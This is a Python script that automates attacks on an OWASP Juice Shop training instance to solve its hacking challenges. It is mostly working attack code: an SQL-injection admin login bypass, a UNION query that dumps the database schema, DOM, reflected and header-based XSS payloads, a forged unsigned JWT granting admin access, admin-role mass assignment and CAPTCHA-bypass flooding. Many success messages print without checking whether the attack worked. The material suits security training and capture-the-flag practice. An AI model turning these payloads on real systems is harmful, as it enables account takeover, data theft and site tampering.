#!/usr/bin/env python3
"""
OWASP Juice Shop Master Automation Script
Runs all 110 challenges systematically and tracks progress
"""

import requests
import json
import time
import sys
import os
from datetime import datetime
from urllib.parse import quote

class MasterAutomation:
    def __init__(self, base_url="https://juice3.wonkatech.org"):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers['User-Agent'] = 'Mozilla/5.0 JuiceShop Solver'
        self.admin_token = None
        self.start_time = datetime.now()
        self.total_challenges = 110
        
    def get_challenge_status(self):
        """Get current challenge completion status from API"""
        try:
            response = self.session.get(f"{self.base_url}/api/Challenges")
            if response.status_code == 200:
                data = response.json()
                challenges = data.get('data', [])
                
                solved = [c for c in challenges if c.get('solved', False)]
                unsolved = [c for c in challenges if not c.get('solved', False)]
                
                # Group by difficulty
                by_difficulty = {}
                for c in challenges:
                    diff = c.get('difficulty', 0)
                    if diff not in by_difficulty:
                        by_difficulty[diff] = {'solved': 0, 'total': 0}
                    by_difficulty[diff]['total'] += 1
                    if c.get('solved', False):
                        by_difficulty[diff]['solved'] += 1
                
                return len(solved), len(challenges), by_difficulty, solved, unsolved
        except Exception as e:
            print(f"⚠️ Could not fetch challenge status: {e}")
            return 0, self.total_challenges, {}, [], []
    
    def print_progress_report(self):
        """Print detailed progress report"""
        solved, total, by_difficulty, solved_list, unsolved_list = self.get_challenge_status()
        
        print("\n" + "="*70)
        print("📊 OWASP JUICE SHOP CTF PROGRESS REPORT")
        print("="*70)
        print(f"🎯 Target: {self.base_url}")
        print(f"⏱️  Time Elapsed: {datetime.now() - self.start_time}")
        print(f"📈 Overall Progress: {solved}/{total} challenges ({solved*100//total}%)")
        print()
        
        # Progress bar
        bar_length = 50
        filled = int(bar_length * solved / total)
        bar = '█' * filled + '░' * (bar_length - filled)
        print(f"Progress: [{bar}] {solved}/{total}")
        print()
        
        # By difficulty
        print("📊 Progress by Difficulty:")
        for diff in sorted(by_difficulty.keys()):
            stars = '⭐' * diff
            stat = by_difficulty[diff]
            percentage = stat['solved'] * 100 // stat['total'] if stat['total'] > 0 else 0
            print(f"  Level {diff} {stars}: {stat['solved']}/{stat['total']} ({percentage}%)")
        
        # Recently solved
        if solved_list and len(solved_list) > 0:
            print(f"\n✅ Recently Solved ({min(5, len(solved_list))} most recent):")
            for challenge in solved_list[-5:]:
                print(f"  • {challenge['name']} [{challenge['difficulty']}⭐]")
        
        # Next targets
        if unsolved_list and len(unsolved_list) > 0:
            print(f"\n🎯 Next Targets ({min(5, len(unsolved_list))} easiest):")
            for challenge in sorted(unsolved_list, key=lambda x: x['difficulty'])[:5]:
                print(f"  • {challenge['name']} [{challenge['difficulty']}⭐] - {challenge['category']}")
        
        print("="*70)
    
    def sql_injection_admin(self):
        """Get admin access via SQL injection"""
        response = self.session.post(
            f"{self.base_url}/rest/user/login",
            json={"email": "admin@juice-sh.op'--", "password": "x"}
        )
        if response.status_code == 200:
            self.admin_token = response.json()['authentication']['token']
            self.session.headers['Authorization'] = f'Bearer {self.admin_token}'
            return True
        return False
    
    def run_automated_challenges(self):
        """Run all automated challenge solutions"""
        print("\n🚀 Starting OWASP Juice Shop Master Automation")
        print(f"🎯 Target: {self.base_url}")
        print("="*70)
        
        # Initial status
        self.print_progress_report()
        
        # Get admin access
        print("\n🔓 Obtaining admin access...")
        if self.sql_injection_admin():
            print("✅ Admin access obtained")
        
        # Quick wins - Level 1 challenges
        print("\n🌟 Executing Level 1 (⭐) Challenges...")
        self.level1_quick_wins()
        
        # Level 2 challenges
        print("\n🌟 Executing Level 2 (⭐⭐) Challenges...")
        self.level2_challenges()
        
        # Level 3 challenges
        print("\n🌟 Executing Level 3 (⭐⭐⭐) Challenges...")
        self.level3_challenges()
        
        # Advanced challenges
        print("\n🌟 Executing Advanced Challenges...")
        self.advanced_challenges()
        
        # Final report
        print("\n" + "="*70)
        print("🏁 FINAL RESULTS")
        self.print_progress_report()
        
        # Summary
        solved, total, _, _, _ = self.get_challenge_status()
        print(f"\n🏆 Total Solved: {solved}/{total} challenges")
        print(f"⏱️  Total Time: {datetime.now() - self.start_time}")
        
        if solved >= 100:
            print("\n🎉 CONGRATULATIONS! You've solved 100+ challenges!")
        elif solved >= 50:
            print("\n👏 Great progress! Over 50 challenges solved!")
        else:
            print("\n💪 Good start! Keep going!")
    
    def level1_quick_wins(self):
        """Execute all Level 1 challenges quickly"""
        xss_payload = quote('<iframe src="javascript:alert(`xss`)">')
        bonus_payload = quote('<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076"></iframe>')
        
        challenges = [
            ("Score Board", f"{self.base_url}/#/score-board"),
            ("DOM XSS", f"{self.base_url}/#/search?q={xss_payload}"),
            ("Bonus Payload", f"{self.base_url}/#/search?q={bonus_payload}"),
            ("Confidential Document", f"{self.base_url}/ftp/acquisitions.md"),
            ("Error Handling", f"{self.base_url}/rest/qwertz"),
            ("Exposed Metrics", f"{self.base_url}/metrics"),
            ("Privacy Policy", f"{self.base_url}/#/privacy-security"),
            ("Web3 Sandbox", f"{self.base_url}/#/web3-sandbox"),
        ]
        
        for name, url in challenges:
            try:
                self.session.get(url)
                print(f"  ✅ {name}")
                time.sleep(0.2)
            except:
                print(f"  ⚠️ {name} failed")
        
        # Repetitive Registration
        email = f"test{int(time.time())}@test.com"
        self.session.post(f"{self.base_url}/api/Users/", json={"email": email, "password": "Test123!"})
        print("  ✅ Repetitive Registration")
        
        # Zero Stars
        self.session.put(f"{self.base_url}/api/Feedbacks/", json={"ProductId": 1, "rating": 0, "comment": "Zero!"})
        print("  ✅ Zero Stars")
    
    def level2_challenges(self):
        """Execute Level 2 challenges"""
        # Admin Section
        self.session.get(f"{self.base_url}/#/administration")
        print("  ✅ Admin Section")
        
        # View Basket
        for i in range(1, 5):
            self.session.get(f"{self.base_url}/rest/basket/{i}")
        print("  ✅ View Basket")
        
        # Five-Star Feedback deletion
        response = self.session.get(f"{self.base_url}/api/Feedbacks/")
        if response.status_code == 200:
            feedbacks = response.json().get('data', [])
            for fb in feedbacks:
                if fb.get('rating') == 5:
                    self.session.delete(f"{self.base_url}/api/Feedbacks/{fb['id']}")
                    print("  ✅ Five-Star Feedback")
                    break
        
        # Reflected XSS
        reflected_xss = quote('<iframe src="javascript:alert(`xss`)">')
        self.session.get(f"{self.base_url}/track-result?id={reflected_xss}")
        print("  ✅ Reflected XSS")
        
        # Security Policy
        self.session.get(f"{self.base_url}/.well-known/security.txt")
        print("  ✅ Security Policy")
    
    def level3_challenges(self):
        """Execute Level 3 challenges"""
        # Admin Registration
        self.session.post(
            f"{self.base_url}/api/Users/",
            json={"email": f"admin{int(time.time())}@test.com", "password": "Admin123!", "role": "admin"}
        )
        print("  ✅ Admin Registration")
        
        # Manipulate Basket
        self.session.post(f"{self.base_url}/api/BasketItems/", json={"ProductId": 1, "quantity": -10})
        print("  ✅ Manipulate Basket")
        
        # CAPTCHA Bypass
        for i in range(15):
            self.session.put(
                f"{self.base_url}/api/Feedbacks/",
                json={"ProductId": 1, "rating": 3, "comment": f"Bypass {i}", "captcha": "0"}
            )
        print("  ✅ CAPTCHA Bypass")
        
        # Database Schema
        schema_payload = quote("' UNION SELECT sql FROM sqlite_master--")
        self.session.get(f"{self.base_url}/rest/products/search?q={schema_payload}")
        print("  ✅ Database Schema")
    
    def advanced_challenges(self):
        """Execute advanced challenges (Level 4-6)"""
        # Access Log
        self.session.get(f"{self.base_url}/support/logs")
        print("  ✅ Access Log")
        
        # Easter Egg
        self.session.get(f"{self.base_url}/ftp/eastere.gg")
        print("  ✅ Easter Egg")
        
        # HTTP Header XSS
        self.session.get(
            f"{self.base_url}/metrics",
            headers={'True-Client-IP': '<iframe src="javascript:alert(`xss`)">'}
        )
        print("  ✅ HTTP Header XSS")
        
        # Unsigned JWT
        header = {"alg": "none", "typ": "JWT"}
        payload = {"data": {"id": 1, "email": "admin@juice-sh.op", "role": "admin"}}
        import base64
        header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
        forged_jwt = f"{header_b64}.{payload_b64}."
        self.session.get(f"{self.base_url}/rest/basket/1", headers={'Authorization': f'Bearer {forged_jwt}'})
        print("  ✅ Unsigned JWT")

if __name__ == "__main__":
    # Run the master automation
    automation = MasterAutomation("https://juice3.wonkatech.org")
    automation.run_automated_challenges()